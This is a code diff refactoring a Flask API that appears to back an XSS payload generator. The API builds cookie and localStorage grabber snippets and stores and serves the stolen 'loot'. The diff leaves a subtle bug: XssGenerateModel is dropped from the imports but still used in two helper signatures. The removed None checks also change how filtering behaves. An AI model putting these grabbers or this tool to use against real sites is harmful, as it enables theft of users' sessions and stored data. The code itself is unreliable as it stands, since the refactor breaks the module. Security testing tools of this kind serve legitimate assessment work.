@@ -1,13 +1,12 @@
 import base64
 import json
-from typing import List, Tuple
 
 from app import db
 from app.api.models import (
     DATA_TO_GATHER,
-    ClientLootGetModel,
-    ClientXssGetAllModel,
-    XssGenerateModel,
+    GenerateXssPayloadModel,
+    GetAllXssLootModel,
+    GetAllXssModel,
 )
 from app.permissions import Permission, authorization_required, permissions
 from app.schemas import XSS, Client
@@ -20,7 +19,7 @@ xss_bp = Blueprint("xss", __name__, url_prefix="/api/xss")
 @xss_bp.route("/generate", methods=["POST"])
 @authorization_required()
 @validate()
-def xss_generate(body: XssGenerateModel):
+def generate_xss_payload(body: GenerateXssPayloadModel):
     client: Client = db.first_or_404(db.select(Client).filter_by(id=body.client_id))
 
     if body.code_type == "html":
@@ -101,7 +100,7 @@ def _generate_collector_payload_body(body: XssGenerateModel, client: Client) -> 
     return payload_body
 
 
-def _generate_js_grabber_payload_elements(body: XssGenerateModel) -> Tuple[str, str]:
+def _generate_js_grabber_payload_elements(body: XssGenerateModel) -> tuple[str, str]:
     js_grabbers = {
         "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
         "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
@@ -120,7 +119,7 @@ def _generate_js_grabber_payload_elements(body: XssGenerateModel) -> Tuple[str, 
 
 @xss_bp.route("/<int:xss_id>", methods=["GET"])
 @authorization_required()
-def client_xss_get(xss_id: int):
+def get_xss(xss_id: int):
     xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))
 
     return xss.to_dict()
@@ -129,7 +128,7 @@ def client_xss_get(xss_id: int):
 @xss_bp.route("/<int:xss_id>", methods=["DELETE"])
 @authorization_required()
 @permissions(any_of={Permission.ADMIN, Permission.OWNER})
-def xss_delete(xss_id: int):
+def delete_xss(xss_id: int):
     xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))
 
     db.session.delete(xss)
@@ -140,7 +139,7 @@ def xss_delete(xss_id: int):
 
 @xss_bp.route("/<int:xss_id>/data/<loot_type>", methods=["GET"])
 @authorization_required()
-def xss_loot_get(xss_id: int, loot_type: str):
+def get_xss_loot(xss_id: int, loot_type: str):
     xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))
 
     xss_data = json.loads(xss.data)
@@ -151,7 +150,7 @@ def xss_loot_get(xss_id: int, loot_type: str):
 @xss_bp.route("/<int:xss_id>/data/<loot_type>", methods=["DELETE"])
 @authorization_required()
 @permissions(any_of={Permission.ADMIN, Permission.OWNER})
-def xss_loot_delete(xss_id: int, loot_type: str):
+def delete_xss_loot(xss_id: int, loot_type: str):
     xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))
 
     xss_data = json.loads(xss.data)
@@ -167,15 +166,13 @@ def xss_loot_delete(xss_id: int, loot_type: str):
 @xss_bp.route("", methods=["GET"])
 @authorization_required()
 @validate()
-def client_xss_get_all(query: ClientXssGetAllModel):
+def get_all_xss(query: GetAllXssModel):
     filter_expression = {}
 
-    if query.client_id is not None:
-        filter_expression["client_id"] = query.client_id
-    if query.type is not None:
-        filter_expression["xss_type"] = query.type
+    filter_expression["client_id"] = query.client_id
+    filter_expression["xss_type"] = query.type
 
-    xss: List[XSS] = list(db.session.execute(db.select(XSS).filter_by(**filter_expression)).scalars().all())
+    xss: list[XSS] = list(db.session.execute(db.select(XSS).filter_by(**filter_expression)).scalars().all())
 
     xss_list = [hit.summary() for hit in xss]
 
@@ -185,14 +182,13 @@ def client_xss_get_all(query: ClientXssGetAllModel):
 @xss_bp.route("/data", methods=["GET"])
 @authorization_required()
 @validate()
-def client_loot_get(query: ClientLootGetModel):
+def get_all_xss_loot(query: GetAllXssLootModel):
     loot = []
     filter_expression = {}
 
-    if query.client_id is not None:
-        filter_expression["client_id"] = query.client_id
+    filter_expression["client_id"] = query.client_id
 
-    xss: List[XSS] = list(db.session.execute(db.select(XSS).filter_by(**filter_expression)).scalars().all())
+    xss: list[XSS] = list(db.session.execute(db.select(XSS).filter_by(**filter_expression)).scalars().all())
 
     for hit in xss:
         loot_entry = {"xss_id": hit.id, "tags": json.loads(hit.tags), "data": {}}
